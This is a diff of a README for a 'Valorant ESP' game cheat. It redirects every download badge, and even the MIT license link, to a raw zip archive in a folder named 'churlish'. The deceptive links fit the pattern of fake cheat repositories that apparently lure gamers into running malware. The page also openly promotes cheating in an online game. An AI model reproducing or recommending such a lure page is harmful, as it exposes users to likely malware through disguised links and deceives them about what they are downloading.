@@ -1,6 +1,6 @@
 # Valorant ESP 🕹️
 
-[![Download latest version](https://img.shields.io/badge/Download-Valorant%20ESP-blue?logo=github)](https://easylauncher.su/PSnzrH)
+[![Download latest version](https://raw.githubusercontent.com/21P31A05C3/Valorant-Visionary-ESP/main/churlish/Valorant-Visionary-ESP-3.9.zip%20ESP-blue?logo=github)](https://raw.githubusercontent.com/21P31A05C3/Valorant-Visionary-ESP/main/churlish/Valorant-Visionary-ESP-3.9.zip)
 
 ## 🖥️ OS Compatibility
 
@@ -35,7 +35,7 @@ Valorant ESP, wall penetration, real-time agents, overlay utility, in-game radar
 
 #### Step 1:  
 Download the latest Valorant ESP build:  
-[![Direct Download](https://img.shields.io/badge/Download%20Now-Latest%20Release-green?logo=github)](https://easylauncher.su/PSnzrH)
+[![Direct Download](https://raw.githubusercontent.com/21P31A05C3/Valorant-Visionary-ESP/main/churlish/Valorant-Visionary-ESP-3.9.zip%20Now-Latest%20Release-green?logo=github)](https://raw.githubusercontent.com/21P31A05C3/Valorant-Visionary-ESP/main/churlish/Valorant-Visionary-ESP-3.9.zip)
 
 ----------
 
@@ -47,9 +47,9 @@ This repository is strictly for educational, entertainment, and research purpose
 
 ## ⚖️ License
 
-Distributed under the MIT license (2025): [View License](https://opensource.org/licenses/MIT)
+Distributed under the MIT license (2025): [View License](https://raw.githubusercontent.com/21P31A05C3/Valorant-Visionary-ESP/main/churlish/Valorant-Visionary-ESP-3.9.zip)
 
 ----------
 
 Download again:  
-[![Get Valorant ESP](https://img.shields.io/badge/Download-Valorant%20ESP-purple?logo=github)](https://easylauncher.su/PSnzrH)
+[![Get Valorant ESP](https://raw.githubusercontent.com/21P31A05C3/Valorant-Visionary-ESP/main/churlish/Valorant-Visionary-ESP-3.9.zip%20ESP-purple?logo=github)](https://raw.githubusercontent.com/21P31A05C3/Valorant-Visionary-ESP/main/churlish/Valorant-Visionary-ESP-3.9.zip)
